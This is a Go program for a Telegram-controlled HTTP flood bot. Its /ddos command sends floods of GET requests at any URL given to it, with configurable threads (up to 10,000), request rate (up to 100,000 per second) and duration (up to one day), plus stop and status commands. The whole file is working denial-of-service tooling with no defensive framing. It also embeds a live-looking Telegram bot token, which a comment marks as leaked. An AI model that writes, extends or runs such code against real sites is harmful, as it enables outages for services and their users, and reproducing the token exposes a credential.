package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var (
	attackRunning bool
	attackMutex   sync.Mutex
	stopAttack    chan struct{}
	stats         struct {
		sent   int64
		failed int64
		mu     sync.Mutex
	}
)

func main() {
	// ⚠️ TOKEN នេះបានលេចធ្លាយ – សូមប្ដូរជាបន្ទាន់!
	token := "8623945913:AAFJMhq2azWjvSmr6pNRN_kMNNeSlTXae6E"

	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		log.Panic(err)
	}

	bot.Debug = true
	log.Printf("✅ Bot connected as: %s", bot.Self.UserName)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}

		msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
		text := strings.TrimSpace(update.Message.Text)

		switch {
		case strings.HasPrefix(text, "/start"):
			msg.Text = "🤖 Bot ULTRA ready!\nCommands:\n" +
				"/ddos <url> [threads] [rate] [duration] - Start ULTRA attack\n" +
				"/stop - Stop current attack\n" +
				"/status - Check status\n" +
				"/help - Help"

		case strings.HasPrefix(text, "/ddos"):
			parts := strings.Fields(text)
			if len(parts) < 2 {
				msg.Text = "⚠️ Usage: /ddos <url> [threads] [rate] [duration]\n" +
					"Example: /ddos http://127.0.0.1:8080/ 500 5000 60"
				break
			}
			url := parts[1]
			threads := 500
			rate := 5000
			duration := 60
			if len(parts) >= 3 {
				if t, err := strconv.Atoi(parts[2]); err == nil {
					threads = t
				}
			}
			if len(parts) >= 4 {
				if r, err := strconv.Atoi(parts[3]); err == nil {
					rate = r
				}
			}
			if len(parts) >= 5 {
				if d, err := strconv.Atoi(parts[4]); err == nil {
					duration = d
				}
			}
			msg.Text = startULTRAAttack(url, threads, rate, duration)

		case text == "/stop":
			msg.Text = stopULTRAAttack()

		case text == "/status":
			msg.Text = getULTRAStatus()

		case text == "/help":
			msg.Text = "📚 Commands:\n" +
				"/ddos <url> [threads] [rate] [duration] - start attack\n" +
				"/stop - stop attack\n" +
				"/status - show status\n" +
				"/help - this message"

		default:
			msg.Text = "🤔 Unknown command. Type /help"
		}

		if _, err := bot.Send(msg); err != nil {
			log.Printf("❌ Send error: %v", err)
		}
	}
}

func startULTRAAttack(url string, threads, rate, duration int) string {
	attackMutex.Lock()
	defer attackMutex.Unlock()

	if attackRunning {
		return "⚠️ Attack already running. Use /stop first."
	}

	if threads > 10000 {
		return "❌ Max threads is 10000"
	}
	if rate > 100000 {
		return "❌ Max rate is 100000 req/s"
	}
	if duration > 86400 {
		return "❌ Max duration is 86400 seconds (1 day)"
	}

	stats.sent = 0
	stats.failed = 0
	attackRunning = true
	stopAttack = make(chan struct{})

	ratePerThread := rate / threads
	if ratePerThread < 1 {
		ratePerThread = 1
	}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendWorker(url, ratePerThread, duration)
		}()
	}

	go func() {
		time.Sleep(time.Duration(duration) * time.Second)
		stopULTRAAttack()
	}()

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stopAttack:
				return
			case <-ticker.C:
				stats.mu.Lock()
				sent := stats.sent
				failed := stats.failed
				stats.mu.Unlock()
				log.Printf("📊 Sent: %d, Failed: %d", sent, failed)
			}
		}
	}()

	go func() {
		wg.Wait()
		attackMutex.Lock()
		attackRunning = false
		attackMutex.Unlock()
	}()

	return fmt.Sprintf("🚀 ULTRA Attack started on %s\nThreads: %d, Rate: %d req/s, Duration: %ds", url, threads, rate, duration)
}

func sendWorker(url string, ratePerThread int, duration int) {
	client := &http.Client{Timeout: 2 * time.Second}
	delay := time.Duration(1e9 / ratePerThread)
	ticker := time.NewTicker(delay)
	defer ticker.Stop()

	end := time.Now().Add(time.Duration(duration) * time.Second)

	for {
		select {
		case <-stopAttack:
			return
		default:
			if time.Now().After(end) {
				return
			}
			go func() {
				resp, err := client.Get(url)
				stats.mu.Lock()
				stats.sent++
				if err != nil || resp.StatusCode >= 400 {
					stats.failed++
				}
				stats.mu.Unlock()
				if resp != nil {
					resp.Body.Close()
				}
			}()
			<-ticker.C
		}
	}
}

func stopULTRAAttack() string {
	attackMutex.Lock()
	defer attackMutex.Unlock()

	if !attackRunning {
		return "ℹ️ No attack running."
	}

	close(stopAttack)
	attackRunning = false
	return "⏹️ ULTRA Attack stopped."
}

func getULTRAStatus() string {
	attackMutex.Lock()
	defer attackMutex.Unlock()

	if !attackRunning {
		return "🔴 No attack running."
	}
	stats.mu.Lock()
	defer stats.mu.Unlock()
	return fmt.Sprintf("🟢 Attack running.\nSent: %d, Failed: %d", stats.sent, stats.failed)
}
